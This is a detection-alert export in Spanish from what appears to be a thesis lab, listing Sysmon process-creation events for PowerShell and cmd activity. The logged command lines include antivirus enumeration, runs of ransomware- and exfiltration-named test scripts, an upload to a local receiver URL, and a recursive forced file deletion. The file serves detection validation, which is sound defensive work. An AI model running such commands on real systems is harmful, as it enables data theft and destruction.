Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:50:22.977Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.977Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:32.022Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.376Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:32.022Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.376Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.593Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -Command Get-Process	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.593Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -Command Get-Process	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.979Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.915Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.916Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.979Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.915Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.916Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.686Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.594Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.686Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.594Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.446Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.446Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.918Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.918Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.128Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.128Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.679Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.564Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.679Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.564Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:42.311Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:42.311Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
